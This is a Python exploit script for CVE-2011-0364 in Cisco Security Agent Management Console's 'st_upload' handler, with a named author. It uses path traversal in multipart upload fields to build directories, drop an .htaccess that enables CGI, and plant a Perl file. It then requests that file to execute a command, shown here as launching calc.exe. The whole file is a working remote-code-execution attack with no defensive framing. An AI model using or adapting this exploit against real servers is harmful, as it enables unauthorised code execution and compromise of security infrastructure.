# Exploits Cisco Security Agent Management Console â€˜st_uploadâ€™ (CVE-2011-0364)
# gerry eisenhaur <gerry.eisenhaur@gmail.com>
 
import httplib
import mimetools
import StringIO
 
_boundary = mimetools.choose_boundary()
_host_uid = &#039;C087EFAE-05A2-4A0B-9512-E05E5ED84AEB&#039;
_csamc = "192.168.0.108"
 
# we need to enable some scripting to get command access
htaccess = "Options +Includes +ExecCGI\r\nAddHandler cgi-script gee"
perl_path = "#!c:/program files/cisco/csamc/csamc60/perl/5.8.7/bin/mswin32-x86/perl\r\n",
backdoor = "exec \"calc.exe\";"
 
def send_request(params=None):
    buf = StringIO.StringIO()
    headers = {"Content-type": &#039;multipart/form-data; boundary=%s&#039; % _boundary}
 
    for(key, value) in params.iteritems():
        buf.write(&#039;--%s\r\n&#039; % _boundary)
        buf.write(&#039;Content-Disposition: form-data; name="%s"&#039; % key)
        buf.write(&#039;\r\n\r\n%s\r\n&#039; % value)
    buf.write(&#039;--&#039; + _boundary + &#039;--\r\n\r\n&#039;)
    body = buf.getvalue()
 
    conn = httplib.HTTPSConnection(_csamc)
    conn.request("POST", "/csamc60/agent", body, headers)
    response = conn.getresponse()
    print response.status, response.reason
    conn.close()
 
def main():
    ### Build up required dir tree
    dirtree = ["../bin/webserver/htdocs/diag/bin",
               "../bin/webserver/htdocs/diag/bin/webserver",
               "../bin/webserver/htdocs/diag/bin/webserver/htdocs"]
    _params = {
        &#039;host_uid&#039;: _host_uid,
        &#039;jobname&#039;: None,
        &#039;host&#039;: "aa",
        &#039;diags&#039;: " ",
        &#039;diagsu&#039;: " ",
        &#039;profiler&#039;: " ",
        &#039;extension&#039;: "gee",
    }
    for path in dirtree:
        print "[+] Creating directory: %s" % path
        _params[&#039;jobname&#039;] = path
        send_request(_params)
 
    ### Done building path, drop files
    print "[+] Dropping .htaccess"
    send_request({
        &#039;host_uid&#039;: _host_uid,
        &#039;jobname&#039;: &#039;&#039;,
        &#039;host&#039;: "/../bin/webserver/",
        &#039;diags&#039;: "",
        &#039;diagsu&#039;: "",
        &#039;profiler&#039;: htaccess,
        &#039;extension&#039;: "/../.htaccess",
    })
 
    print "[+] Dropping payload"
    send_request({
        &#039;host_uid&#039;: _host_uid,
        &#039;jobname&#039;: &#039;&#039;,
        &#039;host&#039;: "/../bin/webserver/htdocs/gerry",
        &#039;diags&#039;: perl_path,
        &#039;diagsu&#039;: "",
        &#039;profiler&#039;: backdoor,
        &#039;extension&#039;: "/../exploit.gee",
    })
 
    print "[+] Done, Executing dropped file."
    try:
        conn = httplib.HTTPSConnection(_csamc, timeout=1)
        conn.request("GET", "/csamc60/exploit.gee")
        response = conn.getresponse()
        print response.status, response.reason
        print response.read()
    except httplib.ssl.SSLError:
        pass
    print "[+] Finished."
 
if __name__ == &#039;__main__&#039;:
    main()



